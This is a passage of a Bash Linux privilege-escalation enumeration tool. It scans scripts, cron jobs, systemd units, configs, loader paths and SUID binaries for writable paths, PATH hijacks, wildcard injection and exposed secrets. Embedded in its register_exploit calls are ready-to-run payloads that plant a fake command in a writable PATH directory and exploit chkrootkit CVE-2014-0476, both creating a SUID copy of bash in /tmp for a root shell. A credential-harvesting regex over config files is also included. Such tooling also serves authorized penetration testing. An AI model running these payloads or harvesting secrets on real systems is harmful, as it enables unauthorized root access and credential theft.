    [ -r "$script" ] || return 0
    [ -f "$script" ] || return 0

    # Cap how much we read — avoid pathological inputs.
    local body
    body=$({ head -c 65536 -- "$script" 2>/dev/null | tr -d '\0'; } 2>/dev/null)
    [ -z "$body" ] && return 0

    # ── source / . includes ───────────────────────────────────────────────────
    printf '%s\n' "$body" | grep -nE '^[[:space:]]*(source|\.)[[:space:]]+' | \
    while IFS= read -r line; do
        local rest src
        rest="${line#*:}"
        src=$(printf '%s' "$rest" | sed -E 's/^[[:space:]]*(source|\.)[[:space:]]+//; s/[[:space:]].*$//; s/[\"'\'']//g')
        register_finding "DEEP_SHELL_SOURCE" "$script" \
            "Sources another file: $src (in $script)" 55 "deep_shell"
        # If sourced path is writable → injection vector.
        case "$src" in
            /*) [ -e "$src" ] && verify_actually_writable "$src" 2>/dev/null && \
                    register_finding "DEEP_SOURCE_WRITABLE" "$src" \
                        "Sourced file writable: $src (sourced by $script)" \
                        93 "deep_shell"
                # Recurse if depth allows
                [ -e "$src" ] && read_deeply "$src" "$(( depth + 1 ))"
                ;;
        esac
    done

    # ── eval ──────────────────────────────────────────────────────────────────
    printf '%s\n' "$body" | grep -nE 'eval[[:space:]]+["$]?' | while IFS= read -r line; do
        register_finding "DEEP_SHELL_EVAL" "$script" \
            "eval call in $script: $(printf '%s' "$line" | cut -c1-160)" \
            80 "deep_shell"
    done

    # ── per-line PATH= override ──────────────────────────────────────────────
    printf '%s\n' "$body" | grep -nE '^[[:space:]]*(export[[:space:]]+)?PATH=' | \
    while IFS= read -r line; do
        register_finding "DEEP_SHELL_PATH_ASSIGN" "$script" \
            "PATH assignment in $script: $(printf '%s' "$line" | cut -c1-160)" \
            60 "deep_shell"
        # Extract path components and check each for writability.
        local pathline pd
        pathline=$(printf '%s' "$line" | sed -E 's/.*PATH=//; s/[[:space:]].*$//; s/[\"'\'']//g')
        printf '%s' "$pathline" | tr ':' '\n' | while IFS= read -r pd; do
            [ -z "$pd" ] && continue
            case "$pd" in '$'*) continue ;; esac   # skip $PATH itself
            [ -d "$pd" ] || continue
            if verify_actually_writable "$pd" 2>/dev/null; then
                register_finding "DEEP_SHELL_PATH_WRITABLE" "$pd" \
                    "PATH dir writable in $script: $pd" 90 "deep_shell"
            fi
        done
    done

    # ── PATH-relative bare commands (no leading /) ───────────────────────────
    # Heuristic: line starts with [a-z] token followed by space + args, but
    # only when the token resolves to something in PATH (would be hijackable).
    printf '%s\n' "$body" | grep -nE '^[[:space:]]*[a-z][a-z0-9_-]{1,30}[[:space:]]' | \
    head -40 | while IFS= read -r line; do
        local tok
        tok=$(printf '%s' "$line" | sed 's/^[0-9]*://; s/^[[:space:]]*//' | awk '{print $1}')
        case "$tok" in
            # Skip shell keywords / common builtins
            if|then|else|elif|fi|for|while|do|done|case|'esac'|return|exit|local|export|declare|readonly|read|echo|printf|set|shift|true|false|cd|continue|break|test|exec|trap|alias|unset|function|source|eval|let|expr|getopts|wait|kill|jobs|pwd|umask|times|type|hash|command|builtin) continue ;;
        esac
        # Only report if a binary by that name resolves on PATH (otherwise
        # noise: variable references, function calls, comments).
        command -v "$tok" >/dev/null 2>&1 || continue
        register_finding "DEEP_SHELL_RELATIVE_CMD" "$script" \
            "Script calls '$tok' without absolute path (PATH hijack candidate)" \
            55 "deep_shell"

        # C5 READABLE_SCRIPT_CALLS_ROOT_BIN — indirect chain:
        # If the resolved command is root-owned (likely invoked at root-priv
        # via cron/systemd) and the script that calls it is readable to us
        # (we proved this above by reading $body), surface as a high-value
        # write-and-wait target — even if we can't directly write the script,
        # the chain itself is exploitable when the script's runner is root.
        local _resolved _ow
        _resolved=$(command -v "$tok" 2>/dev/null)
        if [ -n "$_resolved" ] && [ -e "$_resolved" ]; then
            _ow=$(stat -c '%U' "$_resolved" 2>/dev/null)
            if [ "$_ow" = "root" ]; then
                local _writable_path_dir=""
                local _pd
                for _pd in $(printf '%s' "${PATH:-}" | tr ':' ' '); do
                    [ -d "$_pd" ] || continue
                    if verify_actually_writable "$_pd" 2>/dev/null; then
                        _writable_path_dir="$_pd"; break
                    fi
                done
                if [ -n "$_writable_path_dir" ]; then
                    register_finding "READABLE_SCRIPT_CALLS_ROOT_BIN" "$script" \
                        "Indirect chain: $script calls '$tok' (resolves to root-owned $_resolved) AND $_writable_path_dir is on PATH and writable. Drop fake $tok there, wait for runner. Manual: ls -la $_resolved; echo \$PATH" \
                        88 "deep_shell_c5"
                    register_exploit "READABLE_SCRIPT_CALLS_ROOT_BIN" "$script" \
                        "cat > $_writable_path_dir/$tok <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/_rb && chmod 4755 /tmp/_rb
EOF
chmod +x $_writable_path_dir/$tok
# Now wait for $script to run (cron/systemd/manual), then: /tmp/_rb -p"
                fi
            fi
        fi
    done

    # ── Arg-as-command pattern: VAR=$N; $VAR or similar ──────────────────────
    printf '%s\n' "$body" | grep -nE '^[[:space:]]*(\$[0-9]|"\$[0-9]"|\$[A-Z_][A-Z0-9_]*)[[:space:]]*$' | \
    while IFS= read -r line; do
        register_finding "DEEP_SHELL_ARG_AS_CMD" "$script" \
            "Variable-as-command pattern in $script: $(printf '%s' "$line" | cut -c1-160)" \
            70 "deep_shell"
    done

    # ── Wildcard injection (HIGH-6) ──────────────────────────────────────────
    # Walk lines invoking risky archivers/permission tools with bare wildcards.
    printf '%s\n' "$body" \
        | grep -E '(^|[[:space:]])(tar|rsync|chown|chmod|chgrp|zip|7z|7za)([[:space:]]|$)' \
        | grep -E '[[:space:]]\*|/\*' \
        | while IFS= read -r wline; do
            check_wildcard_injection "$script" "$wline" "script"
        done

    # ── D9: base64 pipe-to-shell (obfuscated dropper detection) ─────────────
    if printf '%s\n' "$body" | grep -qE 'base64[[:space:]]+-d.*\|.*sh|base64[[:space:]]+-d.*\|.*bash|echo.*base64.*\|.*sh'; then
        register_finding "DEEP_SHELL_BASE64_EXEC" "$script" \
            "base64-decode-to-shell pattern in $script — obfuscated code execution" \
            85 "deep_shell"
        # Attempt to decode and recursively analyze
        local b64_cmd b64_decoded
        b64_cmd=$(printf '%s\n' "$body" | grep -oE "echo '[A-Za-z0-9+/=]+'" | head -1 | sed "s/echo '//;s/'//")
        if [ -z "$b64_cmd" ]; then
            b64_cmd=$(printf '%s\n' "$body" | grep -oE 'echo "[A-Za-z0-9+/=]+"' | head -1 | sed 's/echo "//;s/"//')
        fi
        if [ -n "$b64_cmd" ] && command -v base64 >/dev/null 2>&1; then
            b64_decoded=$(printf '%s' "$b64_cmd" | base64 -d 2>/dev/null | head -c 2048)
            if [ -n "$b64_decoded" ]; then
                register_finding "DEEP_SHELL_BASE64_DECODED" "$script" \
                    "Decoded base64 payload preview: $(printf '%s' "$b64_decoded" | cut -c1-200)" \
                    88 "deep_shell"
            fi
        fi
    fi

    # ── D9: Self-integrity hash check trap ───────────────────────────────────
    # Scripts that hash themselves (md5sum $0, sha256sum $0) are tamper-resistant.
    # If we can write the script, we must also update the embedded checksum.
    if printf '%s\n' "$body" | grep -qE '(md5sum|sha256sum|sha1sum)[[:space:]]+\$0|checksum.*\$0|\$0.*checksum'; then
        register_finding "DEEP_SHELL_SELF_INTEGRITY" "$script" \
            "Script $script contains self-integrity hash check (md5sum/sha256sum \$0) — modify script AND update embedded hash or execution will fail" \
            0 "deep_shell_trap"
    fi

    # ── Heredoc content extraction (MEDIUM-4) ────────────────────────────────
    extract_heredoc_content "$script" "$depth"

    return 0
}
analyze_python_script() {
    # Detect: subprocess.* / os.system / os.popen / eval / exec / compile,
    # writable imports (sys.path entries), and .pth files. HIGH-1: only flag
    # .pth lines that start with "import " as code execution. Bare path
    # lines merely extend sys.path — not exploitable on their own.
    local script="${1:-}"
    local depth="${2:-0}"
    [ -r "$script" ] || return 0
    [ -f "$script" ] || return 0

    local body
    body=$({ head -c 65536 -- "$script" 2>/dev/null | tr -d '\0'; } 2>/dev/null)
    [ -z "$body" ] && return 0

    # ── .pth files: special-cased (HIGH-1) ───────────────────────────────────
    case "$script" in
        *.pth)
            # Only `import ` lines execute. Everything else is path-only.
            local exec_lines
            exec_lines=$(printf '%s\n' "$body" | grep -nE '^[[:space:]]*import[[:space:]]+')
            if [ -n "$exec_lines" ]; then
                register_finding "DEEP_PTH_EXECUTING" "$script" \
                    "Python .pth file contains 'import' line — executes on python startup" \
                    85 "deep_python"
            fi
            # Even non-executing .pth being writable = code injection via this
            # exact file. The dir itself being writable is handled elsewhere.
            if verify_actually_writable "$script" 2>/dev/null; then
                register_finding "DEEP_PTH_WRITABLE" "$script" \
                    "Python .pth writable: $script — add 'import os;os.system(...)'" \
                    92 "deep_python"
            fi
            return 0
            ;;
    esac

    # ── Dangerous calls ──────────────────────────────────────────────────────
    printf '%s\n' "$body" | grep -nE 'subprocess\.(call|run|Popen|check_output|check_call)' | \
    head -10 | while IFS= read -r line; do
        register_finding "DEEP_PY_SUBPROCESS" "$script" \
            "subprocess invocation: $(printf '%s' "$line" | cut -c1-160)" \
            55 "deep_python"
    done
    printf '%s\n' "$body" | grep -nE 'os\.(system|popen|execv?[pe]?|spawn)' | \
    head -10 | while IFS= read -r line; do
        register_finding "DEEP_PY_OS_SYSTEM" "$script" \
            "os.system / os.popen / os.exec*: $(printf '%s' "$line" | cut -c1-160)" \
            65 "deep_python"
    done
    printf '%s\n' "$body" | grep -nE '\b(eval|exec)[[:space:]]*\(' | \
    head -10 | while IFS= read -r line; do
        register_finding "DEEP_PY_EVAL" "$script" \
            "eval/exec call: $(printf '%s' "$line" | cut -c1-160)" \
            75 "deep_python"
    done
    printf '%s\n' "$body" | grep -nE 'pickle\.(load|loads)|yaml\.load\(' | \
    head -10 | while IFS= read -r line; do
        register_finding "DEEP_PY_DESERIALIZATION" "$script" \
            "Unsafe deserialization: $(printf '%s' "$line" | cut -c1-160)" \
            70 "deep_python"
    done

    # ── shutil / shell=True subprocess ───────────────────────────────────────
    printf '%s\n' "$body" | grep -nE 'shell[[:space:]]*=[[:space:]]*True' | \
    head -5 | while IFS= read -r line; do
        register_finding "DEEP_PY_SHELL_TRUE" "$script" \
            "subprocess shell=True: $(printf '%s' "$line" | cut -c1-160)" \
            68 "deep_python"
    done

    # ── Writable imports on sys.path ─────────────────────────────────────────
    # If the script does `sys.path.insert(0, '/some/dir')` and that dir is
    # writable, we can shadow any module imported afterwards.
    printf '%s\n' "$body" | grep -nE "sys\.path\.(insert|append)" | \
    while IFS= read -r line; do
        local p
        p=$(printf '%s' "$line" | grep -oE "['\"][^'\"]+['\"]" | head -1 | tr -d "'\"")
        case "$p" in
            /*)
                [ -d "$p" ] && verify_actually_writable "$p" 2>/dev/null && \
                    register_finding "DEEP_PY_SYSPATH_WRITABLE" "$script" \
                        "sys.path.insert references writable dir: $p" 88 "deep_python"
                ;;
        esac
    done

    # Recurse into any imported same-dir local module if it lives in a
    # writable path. (Heuristic: relative `from X import` doesn't give us a
    # path — we leave deep-recursion for Phase 7 wiring.)
    : "$depth"  # depth carried for future recursion
    return 0
}
analyze_binary_strings() {
    # apex_strings() output mining:
    #   - Absolute paths in strings → check writability (config / data file)
    #   - Short PATH-relative tokens → potential PATH hijack
    #   - .so / .dylib references → library hijack candidates
    local bin="${1:-}"
    local depth="${2:-0}"
    [ -r "$bin" ] || return 0
    [ -f "$bin" ] || return 0
    [ "$HAS_STRINGS" = "1" ] || return 0

    # GAP 3: well-known system binaries reference libaudit/libpam/libEGL/etc.
    # by design — those references are NOT exploitable. Skip them entirely so
    # they don't flood TOP 10 with high-conf noise that buries real vectors.
    case "$bin" in
        */sudo|*/su|*/passwd|*/chsh|*/chfn|*/newgrp|*/gpasswd|\
        */snap-confine|*/snap-update-ns|*/snap|\
        */mount|*/umount|*/fusermount|*/fusermount3|\
        */ping|*/ping4|*/ping6|*/traceroute|*/traceroute6|\
        */pkexec|*/polkit-agent-helper-1|\
        */dbus-daemon|*/dbus-launch|\
        */ssh|*/ssh-agent|*/scp|*/sftp)
            return 0 ;;
    esac

    local strs
    strs=$(safe_run 15 apex_strings "$bin" 2>/dev/null)
    [ -z "$strs" ] && return 0

    # ── Absolute path references — check writability ─────────────────────────
    printf '%s\n' "$strs" | grep -oE '^/[A-Za-z0-9_./+-]{4,128}$' | \
        sort -u | head -80 | while IFS= read -r p; do
        # Skip linker / glibc internal paths (high false-positive rate).
        case "$p" in
            /lib/*|/lib64/*|/usr/lib/*|/usr/lib64/*) continue ;;
            /proc/*|/sys/*|/dev/*|/run/*)            continue ;;
        esac
        [ -e "$p" ] || continue
        if verify_actually_writable "$p" 2>/dev/null; then
            register_finding "DEEP_BIN_STRINGS_WRITABLE_PATH" "$bin" \
                "Binary references writable path: $p" 80 "deep_binary"
        fi
    done

    # ── PATH-relative command tokens ─────────────────────────────────────────
    printf '%s\n' "$strs" | grep -oE '^[a-z][a-z0-9_-]{1,20}$' | sort -u | head -40 | \
    while IFS= read -r tok; do
        case "$tok" in
            ls|cp|mv|rm|cat|chmod|chown|find|grep|awk|sed|tar|wget|curl|nc|netcat|sh|bash|python|python3|perl|ruby|node|service|systemctl|ifconfig|ip|route|ping|sudo|su|mail|sendmail|crontab|gzip|gunzip|unzip|zip|head|tail|sort|uniq|cut|tr|date|hostname|whoami|id|env|printenv|kill|killall|ps|top)
                register_finding "DEEP_BIN_RELATIVE_CMD" "$bin" \
                    "Binary references PATH-relative command '$tok' — hijack candidate" \
                    60 "deep_binary"
                ;;
        esac
    done

    # ── Library references (.so) — RPATH analysis already in map_suid_sgid ──
    printf '%s\n' "$strs" | grep -oE 'lib[A-Za-z0-9_+-]+\.so(\.[0-9]+)*' | \
        sort -u | head -20 | while IFS= read -r lib; do
        register_finding "DEEP_BIN_LIB_REF" "$bin" \
            "Binary references library: $lib" 30 "deep_binary"
    done

    : "$depth"
    return 0
}
analyze_unit_file() {
    local unit="${1:-}"
    local depth="${2:-0}"
    [ -r "$unit" ] || return 0
    [ -f "$unit" ] || return 0

    local content
    content=$(safe_run 5 head -c 65536 -- "$unit" 2>/dev/null | tr -d '\0')
    [ -z "$content" ] && return 0

    # ── User= field — only escalation if non-root invokes a root-owned unit;
    #    we record the User for chain reasoning later. ──
    local unit_user
    unit_user=$(printf '%s\n' "$content" | grep -E '^[[:space:]]*User[[:space:]]*=' \
                | head -1 | sed 's/^[[:space:]]*User[[:space:]]*=[[:space:]]*//; s/[[:space:]]*$//')
    [ -z "$unit_user" ] && unit_user="root"

    # ── ExecStart, ExecStartPre, ExecStartPost, ExecStop, ExecReload ──
    printf '%s\n' "$content" | grep -E '^[[:space:]]*Exec(Start|StartPre|StartPost|Stop|StopPost|Reload)[[:space:]]*=' \
        | while IFS= read -r line; do
            local cmd
            cmd=$(printf '%s' "$line" | sed 's/^[[:space:]]*Exec[A-Za-z]*[[:space:]]*=[[:space:]]*//; s/^[-@+!:]*//; s/[[:space:]]*$//')
            [ -z "$cmd" ] && continue
            # Extract leading executable token
            local exe
            exe=$(printf '%s' "$cmd" | awk '{print $1}')
            case "$exe" in
                /*)
                    if [ -e "$exe" ] && verify_actually_writable "$exe" 2>/dev/null; then
                        register_finding "DEEP_UNIT_EXEC_WRITABLE" "$unit" \
                            "Unit ExecStart binary writable: $exe (runs as $unit_user)" 92 "deep_unit"
                    fi
                    # Recurse into the script if it's a script we can read
                    if [ -r "$exe" ] && [ -f "$exe" ]; then
                        read_deeply "$exe" $((depth + 1))
                    fi
                    ;;
                *)
                    # Relative command in unit file — PATH controlled by systemd, but flag
                    register_finding "DEEP_UNIT_RELATIVE_EXEC" "$unit" \
                        "Unit uses relative exec '$exe' (runs as $unit_user)" 50 "deep_unit"
                    ;;
            esac
            # Wildcards in unit commands
            case "$cmd" in
                *' *'*|*'/*'*) check_wildcard_injection "$unit" "$cmd" "unit" ;;
            esac
        done

    # ── EnvironmentFile — writable file = env injection ──
    printf '%s\n' "$content" | grep -E '^[[:space:]]*EnvironmentFile[[:space:]]*=' \
        | while IFS= read -r line; do
            local envf
            envf=$(printf '%s' "$line" | sed 's/^[[:space:]]*EnvironmentFile[[:space:]]*=[[:space:]]*//; s/^-//; s/[[:space:]]*$//')
            [ -z "$envf" ] && continue
            case "$envf" in /*) ;; *) continue ;; esac
            if [ -e "$envf" ] && verify_actually_writable "$envf" 2>/dev/null; then
                register_finding "DEEP_UNIT_ENVFILE_WRITABLE" "$unit" \
                    "Unit EnvironmentFile writable: $envf (runs as $unit_user)" 90 "deep_unit"
            fi
        done

    # ── WorkingDirectory — writable cwd lets attacker plant relative-loaded files ──
    printf '%s\n' "$content" | grep -E '^[[:space:]]*WorkingDirectory[[:space:]]*=' \
        | while IFS= read -r line; do
            local wd
            wd=$(printf '%s' "$line" | sed 's/^[[:space:]]*WorkingDirectory[[:space:]]*=[[:space:]]*//; s/[[:space:]]*$//')
            [ -z "$wd" ] && continue
            case "$wd" in /*) ;; *) continue ;; esac
            if [ -d "$wd" ] && verify_actually_writable "$wd" 2>/dev/null; then
                register_finding "DEEP_UNIT_WORKINGDIR_WRITABLE" "$unit" \
                    "Unit WorkingDirectory writable: $wd (runs as $unit_user)" 70 "deep_unit"
            fi
        done

    return 0
}
analyze_cron_file() {
    local cf="${1:-}"
    local depth="${2:-0}"
    [ -r "$cf" ] || return 0
    [ -f "$cf" ] || return 0

    local content
    content=$(safe_run 5 head -c 65536 -- "$cf" 2>/dev/null | tr -d '\0')
    [ -z "$content" ] && return 0

    # ── File-level PATH= directive — first one wins for jobs below it ──
    local file_path
    file_path=$(printf '%s\n' "$content" | grep -E '^[[:space:]]*PATH[[:space:]]*=' \
                | head -1 | sed 's/^[[:space:]]*PATH[[:space:]]*=[[:space:]]*//; s/^"//; s/"$//; s/[[:space:]]*$//')
    if [ -n "$file_path" ]; then
        local IFS_save="$IFS"
        IFS=':'
        # shellcheck disable=SC2086
        set -- $file_path
        IFS="$IFS_save"
        local pd
        for pd in "$@"; do
            [ -z "$pd" ] && continue
            case "$pd" in /*) ;; *) continue ;; esac
            if [ -d "$pd" ] && verify_actually_writable "$pd" 2>/dev/null; then
                register_finding "DEEP_CRON_PATH_WRITABLE" "$cf" \
                    "Cron PATH= contains writable dir: $pd" 90 "deep_cron"
            fi
        done
    fi

    # ── Walk job lines — extract command, recurse into script targets ──
    printf '%s\n' "$content" | while IFS= read -r line; do
        case "$line" in
            ''|'#'*|*PATH=*|*SHELL=*|*MAILTO=*|*HOME=*) continue ;;
        esac
        # Per-job PATH override (HIGH-5): PATH=/x:$PATH cmd
        case "$line" in
            *PATH=*)
                local override
                override=$(printf '%s' "$line" | grep -oE 'PATH=[^[:space:]]+' | head -1 \
                          | sed 's/^PATH=//; s/^"//; s/"$//')
                if [ -n "$override" ]; then
                    local IFS_save2="$IFS"
                    IFS=':'
                    # shellcheck disable=SC2086
                    set -- $override
                    IFS="$IFS_save2"
                    local od
                    for od in "$@"; do
                        case "$od" in /*) ;; *) continue ;; esac
                        if [ -d "$od" ] && verify_actually_writable "$od" 2>/dev/null; then
                            register_finding "DEEP_CRON_JOB_PATH_WRITABLE" "$cf" \
                                "Cron per-job PATH override has writable dir: $od" 92 "deep_cron"
                        fi
                    done
                fi
                ;;
        esac

        # Extract command portion: skip 5 schedule fields (or @reboot/@hourly etc.)
        local cmd=""
        case "$line" in
            *@reboot*|*@hourly*|*@daily*|*@weekly*|*@monthly*|*@yearly*|*@annually*|*@midnight*)
                cmd=$(printf '%s' "$line" | sed 's/^[[:space:]]*@[a-z]*[[:space:]]*//')
                ;;
            *)
                # Strip schedule (5 fields) + optional user (system crontabs)
                # /etc/crontab and /etc/cron.d/* have user; user crontabs don't.
                case "$cf" in
                    /etc/crontab|/etc/cron.d/*)
                        cmd=$(printf '%s' "$line" | awk '{for(i=7;i<=NF;i++)printf "%s ",$i; print ""}' \
                              | sed 's/[[:space:]]*$//')
                        ;;
                    *)
                        cmd=$(printf '%s' "$line" | awk '{for(i=6;i<=NF;i++)printf "%s ",$i; print ""}' \
                              | sed 's/[[:space:]]*$//')
                        ;;
                esac
                ;;
        esac
        [ -z "$cmd" ] && continue

        # Wildcard injection check
        case "$cmd" in
            *' *'*|*'/*'*) check_wildcard_injection "$cf" "$cmd" "cron" ;;
        esac

        # Vulnerable-tool-runs-as-root check (chkrootkit/binwalk/exiftool with vuln versions)
        case "$cmd" in
            *chkrootkit*)
                local _cv
                _cv=$(safe_run 3 chkrootkit -V 2>&1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
                if [ -z "$_cv" ] || [ "$(printf '%s\n0.50\n' "$_cv" | sort -V | head -1)" = "$_cv" ] && [ "$_cv" != "0.50" ]; then
                    register_finding "CRON_VULN_TOOL_CHKROOTKIT" "$cf" \
                        "Cron runs chkrootkit (CVE-2014-0476: place /tmp/update +x to get root)" 92 "deep_cron"
                    register_exploit "CRON_VULN_TOOL_CHKROOTKIT" "$cf" \
                        "# CVE-2014-0476 — chkrootkit < 0.50 runs /tmp/update as root unconditionally
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/update
chmod +x /tmp/update
# wait for cron to fire — then:
/tmp/rootbash -p"
                fi
                ;;
            *binwalk*)
                local _bv
                _bv=$(safe_run 3 binwalk --help 2>&1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1 | tr -d v)
                if [ -n "$_bv" ] && [ "$(printf '%s\n2.3.4\n' "$_bv" | sort -V | head -1)" = "$_bv" ] && [ "$_bv" != "2.3.4" ]; then
                    register_finding "CRON_VULN_TOOL_BINWALK" "$cf" \
                        "Cron runs binwalk $_bv as root (CVE-2022-4510 RCE via crafted PFS image)" 88 "deep_cron"
                fi
                ;;
            *exiftool*)
                local _ev
                _ev=$(safe_run 3 exiftool -ver 2>/dev/null | head -1)
                if [ -n "$_ev" ] && [ "$(printf '%s\n12.24\n' "$_ev" | sort -V | head -1)" = "$_ev" ] && [ "$_ev" != "12.24" ]; then
                    register_finding "CRON_VULN_TOOL_EXIFTOOL" "$cf" \
                        "Cron runs exiftool $_ev as root (CVE-2021-22204 — DjVu polyglot RCE)" 88 "deep_cron"
                fi
                ;;
            *screen*-r*|*screen*-x*)
                register_finding "CRON_SCREEN_ATTACH" "$cf" \
                    "Cron may attach to root screen — try: screen -r root/<sock>" 60 "deep_cron"
                ;;
        esac

        # First-token target — if absolute, recurse
        local first
        first=$(printf '%s' "$cmd" | awk '{print $1}')
        case "$first" in
            /*)
                if [ -e "$first" ] && verify_actually_writable "$first" 2>/dev/null; then
                    register_finding "DEEP_CRON_CMD_WRITABLE" "$cf" \
                        "Cron command target writable: $first" 92 "deep_cron"
                fi
                if [ -r "$first" ] && [ -f "$first" ]; then
                    read_deeply "$first" $((depth + 1))
                fi
                ;;
        esac
    done

    return 0
}
analyze_config_file() {
    local cf="${1:-}"
    local depth="${2:-0}"
    [ -r "$cf" ] || return 0
    [ -f "$cf" ] || return 0

    # Skip massive files — secrets in configs are usually near the top anyway
    local content
    content=$(safe_run 5 head -c 65536 -- "$cf" 2>/dev/null | tr -d '\0')
    [ -z "$content" ] && return 0

    # Skip binary content
    case "$content" in *$'\x00'*) return 0 ;; esac

    # Secret keyword pattern (broad; reasoner can downgrade)
    local key_pat
    key_pat='(pass(wo?rd)?|passwd|secret|token|api[_-]?key|apikey|access[_-]?key|private[_-]?key|auth[_-]?token|bearer|client[_-]?secret|aws[_-]?secret|aws[_-]?access[_-]?key|db[_-]?pass|mysql[_-]?pass|postgres[_-]?pass|redis[_-]?pass|smtp[_-]?pass|ftp[_-]?pass|jwt[_-]?secret|encryption[_-]?key|signing[_-]?key|stripe[_-]?key|github[_-]?token|gitlab[_-]?token|slack[_-]?token|telegram[_-]?token|discord[_-]?token|sentry[_-]?dsn|pg[_-]?password)'

    # key=value and key: value forms — value must be non-empty / not a placeholder
    printf '%s\n' "$content" \
        | grep -iE "^[[:space:]]*[A-Za-z0-9_.-]*${key_pat}[A-Za-z0-9_.-]*[[:space:]]*[:=][[:space:]]*\S" \
        | grep -ivE '[:=][[:space:]]*("?(\$\{[^}]+\}|<.*>|YOUR[_-]|REPLACE|CHANGE[_-]?ME|EXAMPLE|PLACEHOLDER|XXXX|null|none|true|false|0|1)"?[[:space:]]*$)' \
        | head -25 | while IFS= read -r match; do
            register_finding "DEEP_CONFIG_SECRET" "$cf" \
                "Config contains secret-like assignment: $(printf '%s' "$match" | head -c 120)" 78 "deep_config"
        done

    # Long base64-like strings (32+ chars) — often API keys
    printf '%s\n' "$content" \
        | grep -oE '[A-Za-z0-9+/_-]{32,}={0,2}' \
        | grep -vE '^(0+|1+|[A-F0-9]{32,40})$' \
        | sort -u | head -5 | while IFS= read -r blob; do
            register_finding "DEEP_CONFIG_HIGH_ENTROPY" "$cf" \
                "Config contains high-entropy string ($(printf '%s' "$blob" | wc -c) chars): $(printf '%s' "$blob" | head -c 32)..." 45 "deep_config"
        done

    : "$depth"
    return 0
}
extract_heredoc_content() {
    local script="${1:-}"
    local depth="${2:-0}"
    [ -r "$script" ] || return 0
    [ -f "$script" ] || return 0

    # Find lines opening a heredoc: cmd <<[-]?DELIM   or   cmd <<[-]?'DELIM'
    # Then look at the body until matching DELIM line.
    awk '
        BEGIN { in_hd=0; delim=""; }
        {
            if (!in_hd) {
                # Match unquoted/quoted heredoc opener
                if (match($0, /<<-?[[:space:]]*[\x27"]?[A-Za-z_][A-Za-z0-9_]*[\x27"]?/)) {
                    tag = substr($0, RSTART, RLENGTH)
                    sub(/^<<-?[[:space:]]*/, "", tag)
                    gsub(/[\x27"]/, "", tag)
                    if (tag != "") { delim = tag; in_hd = 1; next }
                }
            } else {
                line = $0
                t = line
                sub(/^[[:space:]]+/, "", t)
                if (t == delim) { in_hd = 0; delim = ""; next }
                print line
            }
        }
    ' "$script" 2>/dev/null | while IFS= read -r body_line; do
        case "$body_line" in
            *'eval '*|*'eval('*)
                register_finding "DEEP_HEREDOC_EVAL" "$script" \
                    "Heredoc body contains eval: $(printf '%s' "$body_line" | head -c 100)" 78 "deep_heredoc"
                ;;
            *'$('*|*'`'*)
                register_finding "DEEP_HEREDOC_CMDSUB" "$script" \
                    "Heredoc body has command substitution: $(printf '%s' "$body_line" | head -c 100)" 50 "deep_heredoc"
                ;;
        esac
    done

    : "$depth"
    return 0
}
analyze_ld_conf() {
    # Scan /etc/ld.so.conf and /etc/ld.so.conf.d/* for writable library dirs.
    # A writable lib dir on the loader's search path = preload any SUID-loaded .so.
    local conf
    for conf in /etc/ld.so.conf /etc/ld.so.conf.d/*.conf; do
        [ -r "$conf" ] || continue
        [ -f "$conf" ] || continue
        if verify_actually_writable "$conf" 2>/dev/null; then
            register_finding "DEEP_LD_CONF_WRITABLE" "$conf" \
                "Loader config file writable — attacker can add lib search dir" 90 "deep_ld"
        fi
        # Library dirs listed inside the conf
        safe_run 3 head -c 32768 -- "$conf" 2>/dev/null \
            | grep -vE '^[[:space:]]*(#|include[[:space:]])' \
            | grep -E '^[[:space:]]*/' \
            | while IFS= read -r libdir; do
                libdir=$(printf '%s' "$libdir" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
                [ -z "$libdir" ] && continue
                [ -d "$libdir" ] || continue
                if verify_actually_writable "$libdir" 2>/dev/null; then
                    register_finding "DEEP_LD_LIBDIR_WRITABLE" "$libdir" \
                        "Loader search dir writable (from $conf) — plant .so to hijack SUID loads" 95 "deep_ld"
                fi
            done
    done

    # /etc/ld.so.conf.d itself writable = drop a new .conf
    if [ -d /etc/ld.so.conf.d ] && verify_actually_writable /etc/ld.so.conf.d 2>/dev/null; then
        register_finding "DEEP_LD_CONFD_WRITABLE" "/etc/ld.so.conf.d" \
            "/etc/ld.so.conf.d/ writable — drop arbitrary .conf to add lib path" 93 "deep_ld"
    fi
    return 0
}

check_suid_library_paths() {
    # HIGH-2 — for every SUID binary discovered in Phase 3, check:
    #   - RPATH/RUNPATH entries via readelf -d
    #   - DT_NEEDED libs vs ld.so search results
    # If any resolvable lib path is writable → root via .so plant.
    local suid_list="${APEX_TMP_DIR:-/tmp}/suid_list.tmp"
    [ -r "$suid_list" ] || return 0

    local rdef
    rdef=$(command -v readelf 2>/dev/null)
    [ -z "$rdef" ] && return 0

    local bin
    while IFS= read -r bin; do
        [ -z "$bin" ] && continue
        [ -x "$bin" ] || continue
        [ -f "$bin" ] || continue

        local rpaths
        rpaths=$(safe_run 5 readelf -d "$bin" 2>/dev/null \
                | grep -E '\((RPATH|RUNPATH)\)' \
                | sed -E 's/.*\[(.*)\].*/\1/')
        [ -z "$rpaths" ] && continue

        local IFS_save="$IFS"
        # rpaths may have multiple :-separated dirs across multiple lines
        local rline
        printf '%s\n' "$rpaths" | while IFS= read -r rline; do
            IFS=':'
            # shellcheck disable=SC2086
            set -- $rline
            IFS="$IFS_save"
            local rdir
            for rdir in "$@"; do
                [ -z "$rdir" ] && continue
                # Resolve $ORIGIN
                case "$rdir" in
                    *'$ORIGIN'*|*'${ORIGIN}'*)
                        local bindir
                        bindir=$(dirname -- "$bin")
                        rdir=$(printf '%s' "$rdir" | sed "s|\\\$ORIGIN|$bindir|g; s|\\\${ORIGIN}|$bindir|g")
                        ;;
                esac
                case "$rdir" in /*) ;; *) continue ;; esac
                [ -d "$rdir" ] || continue
                if verify_actually_writable "$rdir" 2>/dev/null; then
                    register_finding "DEEP_SUID_RPATH_WRITABLE" "$bin" \
                        "SUID binary RPATH/RUNPATH dir writable: $rdir — plant .so for root" 96 "deep_suid"
                fi
            done
        done
    done < "$suid_list"
    return 0
}
check_wildcard_injection() {
    local source_file="${1:-}"
    local cmd="${2:-}"
    local context="${3:-script}"
    [ -z "$cmd" ] && return 0

    # First token = program name
    local prog
    prog=$(printf '%s' "$cmd" | awk '{print $1}' | awk -F/ '{print $NF}')
    [ -z "$prog" ] && return 0

